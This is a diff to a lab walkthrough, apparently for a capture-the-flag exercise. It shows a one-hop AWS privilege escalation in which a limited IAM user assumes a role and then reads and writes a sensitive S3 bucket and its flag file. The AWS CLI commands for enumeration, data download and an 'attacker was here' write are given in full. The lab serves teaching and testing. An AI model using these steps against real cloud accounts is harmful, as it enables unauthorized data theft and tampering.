@@ -8,7 +8,7 @@ This is a one-hop path — a single `sts:AssumeRole` call is all that stands bet
 
 ## The Challenge
 
-You start as `pl-prod-sts-001-to-bucket-starting-user` — an IAM user with minimal permissions. On its own, this user cannot access any S3 buckets. Your goal is to read (and write) the contents of `pl-prod-sts-001-to-bucket-{account_id}`, a bucket containing sensitive data.
+You start as `pl-prod-sts-001-to-bucket-starting-user` — an IAM user with minimal permissions. On its own, this user cannot access any S3 buckets. Your goal is to read (and write) the contents of the lab's target bucket, a bucket containing sensitive data.
 
 The key question is: even though this user cannot access the bucket directly, can it reach a role that can?
 
@@ -17,10 +17,6 @@ The key question is: even though this user cannot access the bucket directly, ca
 First, verify who you are and confirm the limited permissions of your starting position.
 
 ```bash
-export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
-export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
-unset AWS_SESSION_TOKEN
-
 aws sts get-caller-identity --query 'Arn' --output text
 # arn:aws:iam::{account_id}:user/pl-prod-sts-001-to-bucket-starting-user
 ```
@@ -50,10 +46,12 @@ The trust policy will show your starting user ARN listed as a trusted principal 
 ```bash
 aws iam list-role-policies --role-name pl-prod-sts-001-to-bucket-access-role
 aws iam get-role-policy --role-name pl-prod-sts-001-to-bucket-access-role \
-  --policy-name <policy_name>
+  --policy-name s3-access
 ```
 
 The role policy grants `s3:ListBucket`, `s3:GetObject`, and `s3:PutObject` on the target bucket. You have everything you need.
+
+The policy output above shows the full bucket ARN, which ends in your account ID followed by a short random suffix (for example `pl-prod-sts-001-to-bucket-558891026182-itcmij`). Copy that complete bucket name and substitute it for `<BUCKET>` in the commands below.
 
 ## Exploitation
 
@@ -85,22 +83,22 @@ You are now operating as the bucket access role.
 List the contents of the target bucket:
 
 ```bash
-aws s3 ls s3://pl-prod-sts-001-to-bucket-{account_id}/
+aws s3 ls s3://<BUCKET>/
 # 2024-01-01 00:00:00       1234 sensitive-data.txt
 ```
 
 Download the sensitive file:
 
 ```bash
-aws s3 cp s3://pl-prod-sts-001-to-bucket-{account_id}/sensitive-data.txt /tmp/sensitive-data.txt
+aws s3 cp s3://<BUCKET>/sensitive-data.txt /tmp/sensitive-data.txt
 cat /tmp/sensitive-data.txt
 ```
 
 Confirm write access:
 
 ```bash
-echo "attacker was here" | aws s3 cp - s3://pl-prod-sts-001-to-bucket-{account_id}/demo-test-file.txt
-# upload: - to s3://pl-prod-sts-001-to-bucket-{account_id}/demo-test-file.txt
+echo "attacker was here" | aws s3 cp - s3://<BUCKET>/demo-test-file.txt
+# upload: - to s3://<BUCKET>/demo-test-file.txt
 ```
 
 You have read and write access to the sensitive bucket.
@@ -110,7 +108,7 @@ You have read and write access to the sensitive bucket.
 The target bucket contains a `flag.txt` object placed there by Terraform. Read it using the assumed role credentials to capture the CTF flag:
 
 ```bash
-aws s3 cp s3://pl-prod-sts-001-to-bucket-{account_id}/flag.txt -
+aws s3 cp s3://<BUCKET>/flag.txt -
 ```
 
 The flag value will be printed directly to stdout. Record it as proof of successful exploitation.
